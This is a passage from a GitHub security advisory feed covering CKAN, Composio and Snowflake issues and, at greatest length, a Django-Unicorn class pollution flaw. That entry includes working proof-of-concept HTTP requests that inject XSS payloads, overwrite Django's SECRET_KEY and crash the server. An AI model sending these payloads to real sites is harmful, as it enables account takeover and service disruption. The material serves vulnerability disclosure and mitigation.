<p>On versions prior to CKAN 2.10.7 and 2.11.2, site maintainers can restrict the file types supported for uploading using the <a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-mimetypes">ckan.upload.user.mimetypes</a> / <a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-types">ckan.upload.user.types</a> and <a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-mimetypes">ckan.upload.group.mimetypes</a> / <a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-types">ckan.upload.group.types</a> config options.
To entirely disable file uploads you can use:</p>
<pre><code class="language-ini">ckan.upload.user.types = none
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ckan/ckan/security/advisories/GHSA-7pq5-qcp6-mcww">https://github.com/ckan/ckan/security/advisories/GHSA-7pq5-qcp6-mcww</a></li>
<li><a href="https://github.com/ckan/ckan/commit/7da6a26c6183e0a97a356d1b1d2407f3ecc7b9c8">https://github.com/ckan/ckan/commit/7da6a26c6183e0a97a356d1b1d2407f3ecc7b9c8</a></li>
<li><a href="https://github.com/ckan/ckan/commit/a4fc5e06634ed51d653ab819a7efc8e62f816f68">https://github.com/ckan/ckan/commit/a4fc5e06634ed51d653ab819a7efc8e62f816f68</a></li>
<li><a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-mimetypes">https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-mimetypes</a></li>
<li><a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-types">https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-types</a></li>
<li><a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-mimetypes">https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-mimetypes</a></li>
<li><a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-types">https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-types</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24372">https://nvd.nist.gov/vuln/detail/CVE-2025-24372</a></li>
<li><a href="https://github.com/advisories/GHSA-7pq5-qcp6-mcww">https://github.com/advisories/GHSA-7pq5-qcp6-mcww</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7pq5-qcp6-mcww</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-05T17:41:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ckan] CKAN has an XSS vector in user uploaded images in group/org and user profiles]]></title>
        <id>https://github.com/advisories/GHSA-7pq5-qcp6-mcww</id>
        <link href="https://github.com/advisories/GHSA-7pq5-qcp6-mcww"/>
        <updated>2025-02-05T21:45:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Using a specially crafted file, a user could potentially upload a file containing code that when executed could send arbitrary requests to the server. If that file was opened by an administrator, it could lead to escalation of privileges of the original submitter or other malicious actions. Users must have been registered to the site to exploit this vulnerability.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been fixed in CKAN 2.10.7 and 2.11.2</p>
<h3 id="workarounds">Workarounds</h3>
<p>On versions prior to CKAN 2.10.7 and 2.11.2, site maintainers can restrict the file types supported for uploading using the <a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-mimetypes">ckan.upload.user.mimetypes</a> / <a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-types">ckan.upload.user.types</a> and <a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-mimetypes">ckan.upload.group.mimetypes</a> / <a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-types">ckan.upload.group.types</a> config options.
To entirely disable file uploads you can use:</p>
<pre><code class="language-ini">ckan.upload.user.types = none
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ckan/ckan/security/advisories/GHSA-7pq5-qcp6-mcww">https://github.com/ckan/ckan/security/advisories/GHSA-7pq5-qcp6-mcww</a></li>
<li><a href="https://github.com/ckan/ckan/commit/7da6a26c6183e0a97a356d1b1d2407f3ecc7b9c8">https://github.com/ckan/ckan/commit/7da6a26c6183e0a97a356d1b1d2407f3ecc7b9c8</a></li>
<li><a href="https://github.com/ckan/ckan/commit/a4fc5e06634ed51d653ab819a7efc8e62f816f68">https://github.com/ckan/ckan/commit/a4fc5e06634ed51d653ab819a7efc8e62f816f68</a></li>
<li><a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-mimetypes">https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-mimetypes</a></li>
<li><a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-types">https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-group-types</a></li>
<li><a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-mimetypes">https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-mimetypes</a></li>
<li><a href="https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-types">https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-upload-user-types</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24372">https://nvd.nist.gov/vuln/detail/CVE-2025-24372</a></li>
<li><a href="https://github.com/advisories/GHSA-7pq5-qcp6-mcww">https://github.com/advisories/GHSA-7pq5-qcp6-mcww</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7pq5-qcp6-mcww</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-05T17:41:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django-unicorn] Django-Unicorn Class Pollution Vulnerability, Leading to XSS, DoS and Authentication Bypass]]></title>
        <id>https://github.com/advisories/GHSA-g9wf-5777-gq43</id>
        <link href="https://github.com/advisories/GHSA-g9wf-5777-gq43"/>
        <updated>2025-02-04T17:21:54.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>Django-Unicorn is vulnerable to python class pollution vulnerability, a new type of vulnerability categorized under <a href="https://cwe.mitre.org/data/definitions/915.html">CWE-915</a>. The vulnerability arises from the core functionality <code>set_property_value</code>, which can be remotely triggered by users by crafting appropriate component requests and feeding in values of second and third parameter to the vulnerable function, leading to arbitrary changes to the python runtime status. </p>
<p>With this finding, so far we've found at least five ways of vulnerability exploitation, stably resulting in Cross-Site Scripting (XSS), Denial of Service (DoS), and Authentication Bypass attacks in almost every Django-Unicorn-based application.</p>
<h1 id="analysis-of-vulnerable-function">Analysis of Vulnerable Function</h1>
<p>By taking a look at the vulnerable function <code>set_property_value</code> located at: <code>django_unicorn/views/action_parsers/utils.py</code>. You can observe the functionality is responsible for modifying a property value of an object. </p>
<p>The property is specified by a dotted form of path at the second parameter <code>property_name</code>, where nested reference to object is supported, and base object and the assigned value is given by the first parameter <code>component</code> and third parameter <code>property_value</code>.</p>
<pre><code class="language-python"># https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/views/action_parsers/utils.py#L10
def set_property_value(
    component,
    property_name,
    property_value
) -&gt; None:
    ...
    property_name_parts = property_name.split(".")
    component_or_field = component
    ...
    for idx, property_name_part in enumerate(property_name_parts):
        if hasattr(component_or_field, property_name_part):
            if idx == len(property_name_parts) - 1:
                ...
                setattr(component_or_field, property_name_part, property_value)
                ...
            else:
                component_or_field = getattr(component_or_field, property_name_part)
                ...
        elif isinstance(component_or_field, dict):
            if idx == len(property_name_parts) - 1:
                component_or_field[property_name_part] = property_value
                ...
            else:
                component_or_field = component_or_field[property_name_part]
                ...
        elif isinstance(component_or_field, (QuerySet, list)):
            property_name_part_int = int(property_name_part)

            if idx == len(property_name_parts) - 1:
                component_or_field[property_name_part_int] = property_value  # type: ignore[index]
                ...
            else:
                component_or_field = component_or_field[property_name_part_int]  # type: ignore[index]
                ...
        else:
            break
</code></pre>
<p>Meanwhile, this functionality can be directly triggered by a component request, one of the core functionalities of the project, by specifying the request type as <code>syncInput</code> and payload object would be fed in the dotted-path (2nd) parameter and assigned value (3rd) parameter of the vulnerable function.</p>
<pre><code class="language-json">POST /unicorn/message/COMPONENT_NAME

{
    "id": 123,
    "actionQueue":[
        {
          "type": "syncInput",
          "payload": {
          "name": "DOTTED_PATH",
          "value":"ASSIGNED_VALUE"
          }
            }
    ],
    "data": {XXX},
    "epoch": "123",
    "checksum": "XXXX"
}
</code></pre>
<p>You are now aware of that users from the remote can fully control the <code>property_name</code> and <code>property_value</code> of the vulnerable function. By default the preperty value overwrite can only be performed on the component object, which is always the first parameter of the function.</p>
<p>However, the functionality failed to count in the situation where bad actors can modify the normal path to traverse to other objects in the python runtime, by leveraging the <strong>magic attributes</strong>. For example, if the <code>property_name</code> was set to <code>__init__.__globals__</code>, the component context would change to global context of the component module, which means we can modify any attributes of the objects that are located in the global scope of the component module. These objects also include other modules that have been imported in the component module, which comprises of a pollutable dependency chain.</p>
<p>With all these techniques introduced, we can now change any global objects including, global variables/instances/classes/functions of any module that is in a chain of dependency from the component module.</p>
<p>The next section, introduces the five exploitation gadgets found so far, leading to reflected XSS, stored XSS, authentication bypass and DOS attack. It uses a locally deployed <code>django-unicorn.com</code>  as demo website to showcase its large-scale impact.</p>
<blockquote>
<p>Here, gadgets refer to the dependency code snippets by default introduced by django-unicorn and changing its status can result in an attack sequence, such as XSS.</p>
</blockquote>
<h1 id="proof-of-concept">Proof of Concept</h1>
<h2 id="1-reflected-cross-site-scripting-by-overwriting-bs4-html-sanitizer">#1 Reflected Cross-Site Scripting by Overwriting bs4 HTML sanitizer</h2>
<p>Django-Unicorn implants the <code>EntitySubstitution</code> rule from beautifulsoup4 library into its <a href="https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/components/unicorn_template_response.py#L125">HTML formatter</a>, formatting all the template response messages.</p>
<p><img alt="image-20250121163510422" src="https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-35-11-a1aa5cfa196383e3a26636eb80bd85f0.png"></p>
<p>While <a href="https://github.com/akalongman/python-beautifulsoup/blob/master/bs4/dammit.py#L79">this rule</a> is specified in a global dictionary, we can exploit the class pollution vulnerability to overwrite it.</p>
<pre><code class="language-http">POST /unicorn/message/todo HTTP/1.1

{
  "id": 123,
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.&lt;",
        "value": "&lt;img/src=1 onerror=alert('bs4_html_entity_bypass')&gt;"
      }
    }
  ],
  "data": {
    "task": "",
    "tasks": []
  },
  "epoch": "123",
  "checksum": "XXX"
}
</code></pre>
<p>In this demonstration, we replaced the sanitizer's <code>&lt;</code> item value with the XSS payload. whenever a template reponse renders a "&lt;" in cleartext, it will be converted to the payload, leading to XSS attack.</p>
<p><img alt="bs4-xss" src="https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-40-56-5ecbe8f2d39a6cc9a546744ca995b2d9.gif"></p>
<h2 id="2-stored-cross-site-scripting-by-overwriting-unicorn-setting-and-django-json-script-sanitizer">#2 Stored Cross-Site Scripting by Overwriting Unicorn Setting and <a href="https://github.com/django/django">Django</a> Json Script Sanitizer</h2>
<p>There is a script tag in the webpage. Among it, a <code>NAME</code> value is dynamically extracted both from the <code>MORPHER_NAMES</code> and <code>DEFAULT_MORPHER_NAME</code> variable in the <a href="https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/settings.py#L12">setting module</a>. </p>
<p><img alt="image-20250121165007647" src="https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-50-08-f2a628f8d06ba81c9bb71f78766cecb7.png"></p>
<p>However, simply polluting these values can not lead to a stored XSS attack. Django by default escape some of the special characters into unicode sequences.</p>
<p><img alt="image-20250121164947336" src="https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-49-47-b756d516b0b3e3d025d876963e1dbf6a.png"></p>
<p>Going through the source code of django, we found out the actual sanitizer located at <code>_json_script_escapes</code> variable at <a href="https://github.com/django/django/blob/862b7f98a02b7973848db578ff6d24ec8500fdb4/django/utils/html.py#L84">django/utils/html.py</a>.</p>
<p><img alt="image-20250121165247245" src="https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-52-47-b60cd91f46ed89bc7b0a4b3f68521827.png"></p>
<p>By polluting this variable to clear it out, we finally achieve a stored XSS attack.</p>
<p><img alt="image-20250121165839892" src="https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-58-40-97608fc15544d68edbfbdc8e61744b12.png"></p>
<p>PoC:</p>
<pre><code class="language-http">POST /unicorn/message/todo HTTP/1.1

{
  "id": "3gpDSUcxzs1",
  "data": {
    "task": "",
    "tasks": []
  },
  "checksum": "XXX",
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django_unicorn.settings.MORPHER_NAMES",
        "value": [
          "&lt;/script&gt;&lt;script&gt;alert('django json unicode escape bypass + configuration overwrite')&lt;/script&gt;"
        ]
      }
    },
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django_unicorn.settings.DEFAULT_MORPHER_NAME",
        "value": "&lt;/script&gt;&lt;script&gt;alert('django json unicode escape bypass + configuration overwrite')&lt;/script&gt;"
      }
    },
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django.utils.html._json_script_escapes",
        "value": {}
      }
    }
  ],
  "epoch": 1737318956605,
  "hash": "jWGuTFzy"
}
</code></pre>
<p><img alt="json_unicode_xss" src="https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-58-59-f8da2463bbaa8de4f305c6fd2235172b.gif"></p>
<h2 id="3-stored-cross-site-scripting-by-overwriting-django-error-page-source-code">#3 Stored Cross-Site Scripting by Overwriting <a href="https://github.com/django/django">Django</a> Error Page Source Code</h2>
<p>Django by default stores its error page source code in a global variable named <code>ERROR_PAGE_TEMPLATE</code> at <a href="https://github.com/django/django/blob/main/django/views/defaults.py#L16">django/views/defaults.py</a>. </p>
<p><img alt="image-20250121170357900" src="https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-03-58-86c9cf2abfa28f0e1ed479521af5be2e.png"></p>
<p>By polluting this variable to XSS payload. whenever a user triggers an error in the application, such as access an unexisting resource, the attack payload fires out.</p>
<pre><code class="language-http">POST /unicorn/message/todo HTTP/1.1

{
  "id": 123,
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django.views.defaults.ERROR_PAGE_TEMPLATE",
        "value": "&lt;html&gt;&lt;script&gt;alert('error page pollution')&lt;/script&gt;&lt;/html&gt;"
      }
    }
  ],
  "data": {
    "task": "",
    "tasks": []
  },
  "epoch": "123",
  "checksum": "XXX"
}
</code></pre>
<p><img alt="django-404-xss" src="https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-05-05-e6ce889e7549243a5d8a60877fbb8cff.gif"></p>
<h2 id="4-authentication-bypass-by-overwriting-django-secret-key">#4 Authentication Bypass by Overwriting <a href="https://github.com/django/django">Django</a> Secret Key</h2>
<p>Django secret key is typically used to sign and verify session cookies and other security related mechanism. By polluting its runtime value to attacker intended, attacker can forge session cookies to login in to the system as any user.</p>
<p>Even though, django-unicorn.com doesn't have an authentication layer, you can still observe a successful secret key pollution by inspecting the changed checksum in the HTTP response, since the checksum is generated by encrypting the data field in the request body with the secret key.</p>
<pre><code class="language-HTTP">POST /unicorn/message/todo HTTP/1.1

{
  "id": 123,
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django.template.backends.django.settings.SECRET_KEY",
        "value": "test"
      }
    }
  ],
  "data": {
    "task": "",
    "tasks": []
  },
  "epoch": "123",
  "checksum": "XXX"
}
</code></pre>
<p><img alt="authentication_bypass" src="https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-12-20-424da7c5c960471600863828fba93c4a.gif"></p>
<h2 id="5-denial-of-service-by-overwriting-timed-decorator-method">#5 Denial of Service by Overwriting <code>timed</code> Decorator Method</h2>
<p>The <a href="https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/decorators.py#L9">timed</a> decorator is used to modify many important functions in the django-unicorn, such as <a href="https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/views/action_parsers/call_method.py#L122">_call_method_name</a>.</p>
<p><img alt="image-20250121171823756" src="https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-18-24-0e1cec22199ab2dc1bc9bbcb76d2dcd9.png"></p>
<p>By polluting the core decorator method <code>timed</code>  to a string, we make a function call always call a uncallable string, leading to the backend crashed, thus denial of service attack.</p>
<pre><code class="language-http">POST /unicorn/message/todo HTTP/1.1

{
  "id": 123,
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.timed",
        "value": "X"
      }
    }
  ],
  "data": {
    "task": "",
    "tasks": []
  },
  "epoch": "123",
  "checksum": "XXX"
}
</code></pre>
<p><img alt="dos_attack" src="https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-20-39-20ab579669a459c7fb54afeab21dcd4e.gif"></p>
<h1 id="mitigation">Mitigation</h1>
<p>The patch could be:</p>
<ul>
<li>Blocking paths that start with <code>__</code>,  which represent <strong>double under (dunder)</strong> or <strong>magic variables/methods</strong></li>
<li>Set a blacklist for the path, such as <code>RESTRICTED_KEYS = ("__globals__", "__builtins__")</code> adopted by <a href="https://github.com/dgilland/pydash/blob/f4112f61ddb02e5181e781709d775838c9978b97/src/pydash/helpers.py#L211">pydash</a>.</li>
</ul>
<h1 id="related-materials">Related Materials</h1>
<p>For more information about class pollution please refer to:</p>
<p>[1] <a href="https://cwe.mitre.org/data/definitions/915.html">CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes</a></p>
<p>[2] <a href="https://gist.github.com/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca">Report: Class Pollution leading to RCE in pydash</a></p>
<p>[3] <a href="https://blog.abdulrah33m.com/prototype-pollution-in-python/">Blog: Prototype Pollution in Python</a></p>
<p>[4] <a href="https://www.offensiveweb.com/docs/programming/python/class-pollution/">Blog: Class Pollution Gadgets in Jinja Leading to RCE</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43">https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43</a></li>
<li><a href="https://github.com/adamghill/django-unicorn/commit/17614200f27174f789d4af54cc3a1f2b0df7870c">https://github.com/adamghill/django-unicorn/commit/17614200f27174f789d4af54cc3a1f2b0df7870c</a></li>
<li><a href="https://github.com/adamghill/django-unicorn/releases/tag/0.62.0">https://github.com/adamghill/django-unicorn/releases/tag/0.62.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24370">https://nvd.nist.gov/vuln/detail/CVE-2025-24370</a></li>
<li><a href="https://github.com/advisories/GHSA-g9wf-5777-gq43">https://github.com/advisories/GHSA-g9wf-5777-gq43</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g9wf-5777-gq43</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-03T15:48:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[composio-julep] Composio Command Execution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-8h93-28hg-fj84</id>
        <link href="https://github.com/advisories/GHSA-8h93-28hg-fj84"/>
        <updated>2025-01-31T21:07:01.000Z</updated>
        <content type="html"><![CDATA[<p>composio &gt;=0.5.40 is vulnerable to Command Execution in composio_openai, composio_claude, and composio_julep via the handle_tool_calls function.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53526">https://nvd.nist.gov/vuln/detail/CVE-2024-53526</a></li>
<li><a href="https://github.com/ComposioHQ/composio/issues/1073">https://github.com/ComposioHQ/composio/issues/1073</a></li>
<li><a href="https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/claude/composio_claude/toolset.py#L156">https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/claude/composio_claude/toolset.py#L156</a></li>
<li><a href="https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/julep/composio_julep/toolset.py#L21">https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/julep/composio_julep/toolset.py#L21</a></li>
<li><a href="https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/openai/composio_openai/toolset.py#L184">https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/openai/composio_openai/toolset.py#L184</a></li>
<li><a href="https://github.com/ComposioHQ/composio/pull/1107">https://github.com/ComposioHQ/composio/pull/1107</a></li>
<li><a href="https://github.com/ComposioHQ/composio/commit/f496f7fa776335ae7825cad2991c9b38923271fc">https://github.com/ComposioHQ/composio/commit/f496f7fa776335ae7825cad2991c9b38923271fc</a></li>
<li><a href="https://github.com/advisories/GHSA-8h93-28hg-fj84">https://github.com/advisories/GHSA-8h93-28hg-fj84</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8h93-28hg-fj84</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-08T21:32:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[composio-openai] Composio Command Execution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-8h93-28hg-fj84</id>
        <link href="https://github.com/advisories/GHSA-8h93-28hg-fj84"/>
        <updated>2025-01-31T21:07:01.000Z</updated>
        <content type="html"><![CDATA[<p>composio &gt;=0.5.40 is vulnerable to Command Execution in composio_openai, composio_claude, and composio_julep via the handle_tool_calls function.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53526">https://nvd.nist.gov/vuln/detail/CVE-2024-53526</a></li>
<li><a href="https://github.com/ComposioHQ/composio/issues/1073">https://github.com/ComposioHQ/composio/issues/1073</a></li>
<li><a href="https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/claude/composio_claude/toolset.py#L156">https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/claude/composio_claude/toolset.py#L156</a></li>
<li><a href="https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/julep/composio_julep/toolset.py#L21">https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/julep/composio_julep/toolset.py#L21</a></li>
<li><a href="https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/openai/composio_openai/toolset.py#L184">https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/openai/composio_openai/toolset.py#L184</a></li>
<li><a href="https://github.com/ComposioHQ/composio/pull/1107">https://github.com/ComposioHQ/composio/pull/1107</a></li>
<li><a href="https://github.com/ComposioHQ/composio/commit/f496f7fa776335ae7825cad2991c9b38923271fc">https://github.com/ComposioHQ/composio/commit/f496f7fa776335ae7825cad2991c9b38923271fc</a></li>
<li><a href="https://github.com/advisories/GHSA-8h93-28hg-fj84">https://github.com/advisories/GHSA-8h93-28hg-fj84</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8h93-28hg-fj84</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-08T21:32:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[composio-claude] Composio Command Execution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-8h93-28hg-fj84</id>
        <link href="https://github.com/advisories/GHSA-8h93-28hg-fj84"/>
        <updated>2025-01-31T21:07:01.000Z</updated>
        <content type="html"><![CDATA[<p>composio &gt;=0.5.40 is vulnerable to Command Execution in composio_openai, composio_claude, and composio_julep via the handle_tool_calls function.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53526">https://nvd.nist.gov/vuln/detail/CVE-2024-53526</a></li>
<li><a href="https://github.com/ComposioHQ/composio/issues/1073">https://github.com/ComposioHQ/composio/issues/1073</a></li>
<li><a href="https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/claude/composio_claude/toolset.py#L156">https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/claude/composio_claude/toolset.py#L156</a></li>
<li><a href="https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/julep/composio_julep/toolset.py#L21">https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/julep/composio_julep/toolset.py#L21</a></li>
<li><a href="https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/openai/composio_openai/toolset.py#L184">https://github.com/ComposioHQ/composio/blob/11ee7470aa6543097ee30bb036af8e9726dc7a85/python/plugins/openai/composio_openai/toolset.py#L184</a></li>
<li><a href="https://github.com/ComposioHQ/composio/pull/1107">https://github.com/ComposioHQ/composio/pull/1107</a></li>
<li><a href="https://github.com/ComposioHQ/composio/commit/f496f7fa776335ae7825cad2991c9b38923271fc">https://github.com/ComposioHQ/composio/commit/f496f7fa776335ae7825cad2991c9b38923271fc</a></li>
<li><a href="https://github.com/advisories/GHSA-8h93-28hg-fj84">https://github.com/advisories/GHSA-8h93-28hg-fj84</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8h93-28hg-fj84</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-08T21:32:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[snowflake-connector-python] snowflake-connector-python vulnerable to SQL Injection in write_pandas]]></title>
        <id>https://github.com/advisories/GHSA-2vpq-fh52-j3wv</id>
        <link href="https://github.com/advisories/GHSA-2vpq-fh52-j3wv"/>
        <updated>2025-01-29T22:00:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="issue">Issue</h3>
<p>Snowflake discovered and remediated a vulnerability in the Snowflake Connector for Python. A function from the snowflake.connector.pandas_tools module is vulnerable to SQL injection.</p>
<p>This vulnerability affects versions 2.2.5 through 3.13.0. Snowflake fixed the issue in version 3.13.1.</p>
<h3 id="vulnerability-details">Vulnerability Details</h3>
<p>A function from the snowflake.connector.pandas_tools module is not sanitizing all of its arguments, and queries using them are not parametrized. An attacker controlling these arguments could achieve SQL injection by passing crafted input. Any SQL executed that way by an attacker would still run in the context of the current session.</p>
<h3 id="solution">Solution</h3>
<p>Snowflake released version 3.13.1 of the Snowflake Connector for Python, which fixes this issue. We recommend users upgrade to version 3.13.1.</p>
<h3 id="additional-information">Additional Information</h3>
<p>If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our <a href="https://hackerone.com/snowflake?type=team">Vulnerability Disclosure Policy</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-2vpq-fh52-j3wv">https://github.com/snowflakedb/snowflake-connector-python/security/advisories/GHSA-2vpq-fh52-j3wv</a></li>
<li><a href="https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1">https://github.com/snowflakedb/snowflake-connector-python/releases/tag/v3.13.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24793">https://nvd.nist.gov/vuln/detail/CVE-2025-24793</a></li>
<li><a href="https://github.com/snowflakedb/snowflake-connector-python/commit/f3f9b666518d29c31a49384bbaa9a65889e72056">https://github.com/snowflakedb/snowflake-connector-python/commit/f3f9b666518d29c31a49384bbaa9a65889e72056</a></li>
<li><a href="https://github.com/advisories/GHSA-2vpq-fh52-j3wv">https://github.com/advisories/GHSA-2vpq-fh52-j3wv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2vpq-fh52-j3wv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-29T20:50:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[snowflake-connector-python] snowflake-connector-python vulnerable to insecure deserialization of the OCSP response cache]]></title>
        <id>https://github.com/advisories/GHSA-m4f6-vcj4-w5mx</id>
        <link href="https://github.com/advisories/GHSA-m4f6-vcj4-w5mx"/>
        <updated>2025-01-29T22:00:32.000Z</updated>
